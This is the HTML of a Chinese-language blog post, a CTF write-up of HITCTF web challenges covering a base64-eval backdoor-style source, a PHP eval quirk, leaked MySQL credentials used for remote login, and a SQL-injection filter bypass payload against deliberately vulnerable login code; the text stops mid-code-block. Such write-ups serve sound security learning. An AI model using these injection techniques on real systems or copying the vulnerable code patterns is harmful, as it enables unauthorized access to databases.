@@ -1,0 +1,644 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="utf-8">
+  
+  <title>[hitctf] Web Writeup | Pr0ph3t</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="PHP reading    * 上扫描器扫出index.php.bak 下载”源码”1    2    3                          里面的内容base64decode之后是源码  1   $flag=$_GET[&apos;asdfgjxzkallgj88">
+<meta name="keywords" content="CyberSecurity,old,writeup">
+<meta property="og:type" content="article">
+<meta property="og:title" content="[hitctf] Web Writeup">
+<meta property="og:url" content="https://blog.pr0ph3t.com/2018/02/03/hitctf-Web-Writeup/index.html">
+<meta property="og:site_name" content="Pr0ph3t">
+<meta property="og:description" content="PHP reading    * 上扫描器扫出index.php.bak 下载”源码”1    2    3                          里面的内容base64decode之后是源码  1   $flag=$_GET[&apos;asdfgjxzkallgj88">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="http://upload-images.jianshu.io/upload_images/6949366-0ba893f7281338e5.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="http://upload-images.jianshu.io/upload_images/6949366-883b80a34b846d93.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="http://upload-images.jianshu.io/upload_images/6949366-3e311016aa9d2f7c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="http://upload-images.jianshu.io/upload_images/6949366-7021aed89db67a5b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="http://upload-images.jianshu.io/upload_images/6949366-b8e718fdec2525c2.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="http://upload-images.jianshu.io/upload_images/6949366-deb234b094f3084c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="http://upload-images.jianshu.io/upload_images/6949366-9299685b679f15fc.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="http://upload-images.jianshu.io/upload_images/6949366-5adeea0bf139af79.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="http://upload-images.jianshu.io/upload_images/6949366-f1574ad344c979bd.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="http://upload-images.jianshu.io/upload_images/6949366-5ffcfc32357cd9af.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="http://upload-images.jianshu.io/upload_images/6949366-3c19522d8c3cafc4.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="http://upload-images.jianshu.io/upload_images/6949366-4a9c85579b856e5f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="http://upload-images.jianshu.io/upload_images/6949366-fa09e3a241b5f5c2.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="http://upload-images.jianshu.io/upload_images/6949366-10bab2f44945d24d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="http://upload-images.jianshu.io/upload_images/6949366-075ca45cc900e15d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="http://upload-images.jianshu.io/upload_images/6949366-8419cc47d357f2be.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="http://upload-images.jianshu.io/upload_images/6949366-2ddb11dcb5173ff5.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="http://upload-images.jianshu.io/upload_images/6949366-a28936abd759c540.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="http://upload-images.jianshu.io/upload_images/6949366-d979ab76e3f5ea9f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="http://upload-images.jianshu.io/upload_images/6949366-78d8a69888acffa5.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="http://upload-images.jianshu.io/upload_images/6949366-54e7137de9f74c04.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="http://upload-images.jianshu.io/upload_images/6949366-22eaa961ca5c2650.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="http://upload-images.jianshu.io/upload_images/6949366-d696d36dd8f138b5.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="http://upload-images.jianshu.io/upload_images/6949366-a05457fd5bbf98fc.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="http://upload-images.jianshu.io/upload_images/6949366-2ce0621724e33fa9.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="http://upload-images.jianshu.io/upload_images/6949366-7b15abb40f5d6f50.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="http://upload-images.jianshu.io/upload_images/6949366-efbb02face8b1907.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="http://upload-images.jianshu.io/upload_images/6949366-a15084bd495d6402.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="http://upload-images.jianshu.io/upload_images/6949366-df4c728cf652119d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="http://upload-images.jianshu.io/upload_images/6949366-dab440f466d7dcef.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="http://upload-images.jianshu.io/upload_images/6949366-edd3f5bef4d827ce.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="http://upload-images.jianshu.io/upload_images/6949366-f17c4d11ee5aa782.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="http://upload-images.jianshu.io/upload_images/6949366-2ce92c3955b30af0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="http://upload-images.jianshu.io/upload_images/6949366-d67d84c59f04866d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="http://upload-images.jianshu.io/upload_images/6949366-b0fe211cfcdbc791.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="http://upload-images.jianshu.io/upload_images/6949366-341b63f82a18e765.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="http://upload-images.jianshu.io/upload_images/6949366-3555c9c082a001a2.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="http://upload-images.jianshu.io/upload_images/6949366-053cb81199efeee0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:updated_time" content="2019-07-06T09:55:58.100Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="[hitctf] Web Writeup">
+<meta name="twitter:description" content="PHP reading    * 上扫描器扫出index.php.bak 下载”源码”1    2    3                          里面的内容base64decode之后是源码  1   $flag=$_GET[&apos;asdfgjxzkallgj88">
+<meta name="twitter:image" content="http://upload-images.jianshu.io/upload_images/6949366-0ba893f7281338e5.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+  
+    <link rel="alternative" href="/atom.xml" title="Pr0ph3t" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/img/favicon.png">
+  
+  
+      <link rel="stylesheet" href="//cdn.bootcss.com/animate.css/3.5.0/animate.min.css">
+  
+  <link rel="stylesheet" href="/css/style.css">
+  <link rel="stylesheet" href="/font-awesome/css/font-awesome.min.css">
+  <link rel="apple-touch-icon" href="/apple-touch-icon.png">
+  
+  
+      <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  
+  <!-- 加载特效 -->
+    <script src="/js/pace.js"></script>
+    <link href="/css/pace/pace-theme-flash.css" rel="stylesheet">
+  <script>
+      var yiliaConfig = {
+          rootUrl: '/',
+          fancybox: true,
+          animate: true,
+          isHome: false,
+          isPost: true,
+          isArchive: false,
+          isTag: false,
+          isCategory: false,
+          open_in_new: false
+      }
+  </script>
+</head></html>
+<body>
+  <div id="container">
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+    <header id="header" class="inner">
+        <a href="/" class="profilepic">
+            
+            <img lazy-src="/img/head.webp" class="js-avatar">
+            
+        </a>
+
+        <hgroup>
+          <h1 class="header-author"><a href="/" title="Hi Mate">Pr0ph3t</a></h1>
+        </hgroup>
+
+        
+        <p class="header-subtitle">菜菜菜</p>
+        
+        
+        
+            <div id="switch-btn" class="switch-btn">
+                <div class="icon">
+                    <div class="icon-ctn">
+                        <div class="icon-wrap icon-house" data-idx="0">
+                            <div class="birdhouse"></div>
+                            <div class="birdhouse_holes"></div>
+                        </div>
+                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
+                            <div class="ribbon"></div>
+                        </div>
+                        
+                        <div class="icon-wrap icon-link hide" data-idx="2">
+                            <div class="loopback_l"></div>
+                            <div class="loopback_r"></div>
+                        </div>
+                        
+                        
+                    </div>
+                    
+                </div>
+                <div class="tips-box hide">
+                    <div class="tips-arrow"></div>
+                    <ul class="tips-inner">
+                        <li>菜单</li>
+                        <li>标签</li>
+                        
+                        <li>友情链接</li>
+                        
+                        
+                    </ul>
+                </div>
+            </div>
+        
+
+        <div id="switch-area" class="switch-area">
+            <div class="switch-wrap">
+                <section class="switch-part switch-part1">
+                    <nav class="header-menu">
+                        <ul>
+                        
+                            <li><a href="/">博客首页</a></li>
+                        
+                            <li><a href="/articles">文章</a></li>
+                        
+                            <li><a href="/about">关于我</a></li>
+                        
+                            <li><a href="/tags">tags</a></li>
+                        
+                        </ul>
+                    </nav>
+                    <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fl mail" target="_blank" href="mailto://admin@pr0ph3t.com" title="mail">mail</a>
+                            
+                                <a class="fl github" target="_blank" href="https://github.com/Pr0phet" title="github">github</a>
+                            
+                        </ul>
+                    </nav>
+                </section>
+                
+                
+                <section class="switch-part switch-part2">
+                    <div class="widget tagcloud" id="js-tagcloud">
+                        <a href="/tags/Attack-Defense/" style="font-size: 12.5px;">Attack&Defense</a> <a href="/tags/CyberSecurity/" style="font-size: 20px;">CyberSecurity</a> <a href="/tags/crypto/" style="font-size: 10px;">crypto</a> <a href="/tags/hitcon/" style="font-size: 15px;">hitcon</a> <a href="/tags/old/" style="font-size: 20px;">old</a> <a href="/tags/writeup/" style="font-size: 17.5px;">writeup</a>
+                    </div>
+                </section>
+                
+                
+                
+                <section class="switch-part switch-part3">
+                    <div id="js-friends">
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="https://aluvion.github.io">twings</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="https://blog.de1ta.club">De1ta</a>
+                    
+                    </div>
+                </section>
+                
+
+                
+            </div>
+        </div>
+    </header>                
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+      <div class="overlay">
+          <div class="slider-trigger"></div>
+          <h1 class="header-author js-mobile-header hide"><a href="/" title="Me">Pr0ph3t</a></h1>
+      </div>
+    <div class="intrude-less">
+        <header id="header" class="inner">
+            <a href="/" class="profilepic">
+                
+                    <img lazy-src="/img/head.webp" class="js-avatar">
+                
+            </a>
+            <hgroup>
+              <h1 class="header-author"><a href="/" title="Me">Pr0ph3t</a></h1>
+            </hgroup>
+            
+            <p class="header-subtitle">菜菜菜</p>
+            
+            <nav class="header-menu">
+                <ul>
+                
+                    <li><a href="/">博客首页</a></li>
+                
+                    <li><a href="/articles">文章</a></li>
+                
+                    <li><a href="/about">关于我</a></li>
+                
+                    <li><a href="/tags">tags</a></li>
+                
+                <div class="clearfix"></div>
+                </ul>
+            </nav>
+            <nav class="header-nav">
+                <div class="social">
+                    
+                        <a class="mail" target="_blank" href="mailto://admin@pr0ph3t.com" title="mail">mail</a>
+                    
+                        <a class="github" target="_blank" href="https://github.com/Pr0phet" title="github">github</a>
+                    
+                </div>
+            </nav>
+        </header>                
+    </div>
+</nav>
+      <div class="body-wrap"><article id="post-hitctf-Web-Writeup" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2018/02/03/hitctf-Web-Writeup/" class="article-date">
+      <time datetime="2018-02-02T19:25:00.000Z" itemprop="datePublished">2018-02-03</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      [hitctf] Web Writeup
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+
+        
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CyberSecurity/">CyberSecurity</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/old/">old</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/writeup/">writeup</a></li></ul>
+    </div>
+
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <h3 id="PHP-reading"><a href="#PHP-reading" class="headerlink" title="PHP reading"></a>PHP reading</h3><p><img src="http://upload-images.jianshu.io/upload_images/6949366-0ba893f7281338e5.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="PHP reading"></p>
+<ul>
+<li>上扫描器扫出index.php.bak 下载”源码”<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    <span class="keyword">eval</span>(base64_decode(<span class="string">'JGZsYWc9JF9HRVRbJ2FzZGZnanh6a2FsbGdqODg1MiddO2lmKCRmbGFnPT0nSDFUY3RGMjAxOEV6Q1RGJyl7ZGllKCRmbGFnKTt9ZGllKCdlbW1tbScpOw=='</span>))</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<p>里面的内容base64decode之后是源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$flag=$_GET[<span class="string">'asdfgjxzkallgj8852'</span>];<span class="keyword">if</span>($flag==<span class="string">'H1TctF2018EzCTF'</span>)&#123;<span class="keyword">die</span>($flag);&#125;<span class="keyword">die</span>(<span class="string">'emmmm'</span>);</span><br></pre></td></tr></table></figure>
+
+<p>输入url<code>http://198.13.58.35:8899?asdfgjxzkallgj8852= H1TctF2018EzCTF</code>之后得到flag</p>
+<h3 id="BabyEval"><a href="#BabyEval" class="headerlink" title="BabyEval"></a>BabyEval</h3><p><img src="http://upload-images.jianshu.io/upload_images/6949366-883b80a34b846d93.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="BabyEval"></p>
+<ul>
+<li><p>进入之后查看html源码发现题目源码</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">$str=@(string)$_GET['str'];</span></span><br><span class="line"><span class="comment">blackListFilter($black_list, $str);</span></span><br><span class="line"><span class="comment">eval('$str="'.addslashes($str).'";');</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>以前一航师傅分析过这一题<br><a href="https://www.jianshu.com/p/dd72566ca4df" target="_blank" rel="noopener">https://www.jianshu.com/p/dd72566ca4df</a><br>我觉得可能是可变变量的简写形式导致的这个问题,如文档所说</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$aaa = <span class="string">'phpinfo'</span>;</span><br><span class="line">$b = <span class="string">'aaa'</span>;</span><br><span class="line"><span class="keyword">echo</span> $$b; <span class="comment">//输出phpinfo</span></span><br><span class="line"></span><br><span class="line"><span class="comment">////////////</span></span><br><span class="line"></span><br><span class="line">$a = <span class="string">'phpinfo'</span>;</span><br><span class="line">$b = <span class="string">'aaa'</span>;</span><br><span class="line"><span class="keyword">echo</span> $&#123;$b&#125;; <span class="comment">//也输出phpinfo</span></span><br><span class="line"><span class="comment">//则以下也是正确的</span></span><br><span class="line"><span class="keyword">echo</span> $&#123;<span class="string">'aaa'</span>&#125;; <span class="comment">//也输出phpinfo</span></span><br><span class="line"><span class="keyword">echo</span> $&#123;<span class="string">'a'</span>+<span class="string">'aa'</span>&#125;; <span class="comment">//也输出phpinfo</span></span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<p><img src="http://upload-images.jianshu.io/upload_images/6949366-3e311016aa9d2f7c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="try">做了一下尝试,花括号内是可以执行运算的,并且会强制类型转换成字符串,猜测是类似一个eval再强制转换成字符串?留个坑…以后研究源码的时候再看看….</p>
+<h3 id="BabyLeakage"><a href="#BabyLeakage" class="headerlink" title="BabyLeakage"></a>BabyLeakage</h3><p><img src="http://upload-images.jianshu.io/upload_images/6949366-7021aed89db67a5b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="BabyLeakage"></p>
+<ul>
+<li><p>题目疯狂引导我们去使应用出错<img src="http://upload-images.jianshu.io/upload_images/6949366-b8e718fdec2525c2.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="通知"><br><img src="http://upload-images.jianshu.io/upload_images/6949366-deb234b094f3084c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="锦囊"></p>
+</li>
+<li><p>首先试一试url方面<br><img src="http://upload-images.jianshu.io/upload_images/6949366-9299685b679f15fc.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="route_error"></p>
+</li>
+<li><p>逐个尝试之后在news/auth路由下发现了一个奇怪的报错<br><img src="http://upload-images.jianshu.io/upload_images/6949366-5adeea0bf139af79.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="error"><br>其中更是爆出了mysql的账号密码<img src="http://upload-images.jianshu.io/upload_images/6949366-f1574ad344c979bd.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="info"></p>
+</li>
+<li><p>我们探测一下该ip的mysql默认端口的情况<img src="http://upload-images.jianshu.io/upload_images/6949366-5ffcfc32357cd9af.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="mysql-3306"></p>
+</li>
+<li><p>既然开启的话我们尝试远程登录<br><img src="http://upload-images.jianshu.io/upload_images/6949366-3c19522d8c3cafc4.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="mysql-login"><br>bingo!</p>
+</li>
+<li><p>最后在F1agIsHere库的表描述下找到flag</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> use F1agIsHere;</span></span><br><span class="line">Reading table information for completion of table and column names</span><br><span class="line">You can turn off this feature to get a quicker startup with -A</span><br><span class="line"></span><br><span class="line">Database changed</span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> show tables;</span></span><br><span class="line">+----------------------+</span><br><span class="line">| Tables_in_F1agIsHere |</span><br><span class="line">+----------------------+</span><br><span class="line">| a                    |</span><br><span class="line">| f                    |</span><br><span class="line">| g                    |</span><br><span class="line">| l                    |</span><br><span class="line">+----------------------+</span><br><span class="line">4 rows in set (0.05 sec)</span><br><span class="line"></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> describe f;</span></span><br><span class="line">+-------+------+------+-----+---------+-------+</span><br><span class="line">| Field | Type | Null | Key | Default | Extra |</span><br><span class="line">+-------+------+------+-----+---------+-------+</span><br><span class="line">| H     | text | YES  |     | NULL    |       |</span><br><span class="line">| I     | text | YES  |     | NULL    |       |</span><br><span class="line">| TC    | text | YES  |     | NULL    |       |</span><br><span class="line">| T     | text | YES  |     | NULL    |       |</span><br><span class="line">| F     | text | YES  |     | NULL    |       |</span><br><span class="line">+-------+------+------+-----+---------+-------+</span><br><span class="line">5 rows in set (0.04 sec)</span><br><span class="line"></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> describe l;</span></span><br><span class="line">+---------+------+------+-----+---------+-------+</span><br><span class="line">| Field   | Type | Null | Key | Default | Extra |</span><br><span class="line">+---------+------+------+-----+---------+-------+</span><br><span class="line">| &#123;       | text | YES  |     | NULL    |       |</span><br><span class="line">| C10se_  | text | YES  |     | NULL    |       |</span><br><span class="line">| Debu91n | text | YES  |     | NULL    |       |</span><br><span class="line">+---------+------+------+-----+---------+-------+</span><br><span class="line">3 rows in set (0.05 sec)</span><br><span class="line"></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> describe a;</span></span><br><span class="line">+----------+------+------+-----+---------+-------+</span><br><span class="line">| Field    | Type | Null | Key | Default | Extra |</span><br><span class="line">+----------+------+------+-----+---------+-------+</span><br><span class="line">| fo_Is_Im | text | YES  |     | NULL    |       |</span><br><span class="line">| mmp      | text | YES  |     | NULL    |       |</span><br><span class="line">| ort      | text | YES  |     | NULL    |       |</span><br><span class="line">+----------+------+------+-----+---------+-------+</span><br><span class="line">3 rows in set (0.05 sec)</span><br><span class="line"></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> describe g;</span></span><br><span class="line">+-------+------+------+-----+---------+-------+</span><br><span class="line">| Field | Type | Null | Key | Default | Extra |</span><br><span class="line">+-------+------+------+-----+---------+-------+</span><br><span class="line">| 4n7   | text | YES  |     | NULL    |       |</span><br><span class="line">| &#125;     | text | YES  |     | NULL    |       |</span><br><span class="line">+-------+------+------+-----+---------+-------+</span><br><span class="line">2 rows in set (0.06 sec)</span><br><span class="line"></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"></span></span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<h3 id="BabyInjection"><a href="#BabyInjection" class="headerlink" title="BabyInjection"></a>BabyInjection</h3><p><img src="http://upload-images.jianshu.io/upload_images/6949366-4a9c85579b856e5f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="BabyInjection"></p>
+<ul>
+<li><p>题目给了源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_POST[<span class="string">'username'</span>]) || !<span class="keyword">isset</span>($_POST[<span class="string">'passwd'</span>])) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'Login and get the flag'</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;form action="" method="post"&gt;'</span>.<span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;input name="username" type="text" placeholder="username"/&gt;'</span>.<span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;input name="passwd" type="text" placeholder="passwd"/&gt;'</span>.<span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;input type="submit" &gt;&lt;/input&gt;'</span>.<span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;/form&gt;'</span>.<span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line">    <span class="keyword">die</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$flag = <span class="string">''</span>;</span><br><span class="line">$filter = <span class="string">"and|select|from|where|union|join|sleep|benchmark|,|\(|\)|like|rlike|regexp|limit|or"</span>;</span><br><span class="line"></span><br><span class="line">$username = $_POST[<span class="string">'username'</span>];</span><br><span class="line">$passwd = $_POST[<span class="string">'passwd'</span>];</span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">"/"</span>.$filter.<span class="string">"/is"</span>,$username)==<span class="number">1</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"Hacker hacker hacker~"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">"/"</span>.$filter.<span class="string">"/is"</span>,$passwd)==<span class="number">1</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"Hacker hacker hacker~"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$conn = mysqli_connect();</span><br><span class="line"></span><br><span class="line">$query = <span class="string">"SELECT * FROM users WHERE username='&#123;$username&#125;';"</span>;</span><br><span class="line"><span class="keyword">echo</span> $query.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">$query = mysqli_query($conn, $query);</span><br><span class="line"><span class="keyword">if</span> (mysqli_num_rows($query) == <span class="number">1</span>)&#123;</span><br><span class="line">    $result = mysqli_fetch_array($query);</span><br><span class="line">    <span class="keyword">if</span> ($result[<span class="string">'passwd'</span>] == $passwd)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'you did it and this is your flag: '</span>.$flag);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'Wrong password'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'Wrong username'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>ban掉了很多关键字<br>而且从ban list里面感觉到出题人并不是想我们找出真正的密码,而是单纯的绕过,是以前碰到的一个题目的套路,首先可以用group by passwd with rollup来制造一个空行(利用统计函数,查询结果多一行并且passwd为空),这里本来可以直接用limit筛选出我们需要的那个空行,但是这里limit被ban了,没关系,还可以用having子句来筛选出我们需要的带有空字段的行,因为having子句是再分组查询之后再执行的,所以最后post payload如下<code>username=&#39;|| 1 group by passwd with rollup having passwd is null#&amp;passwd=</code></p>
+</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span 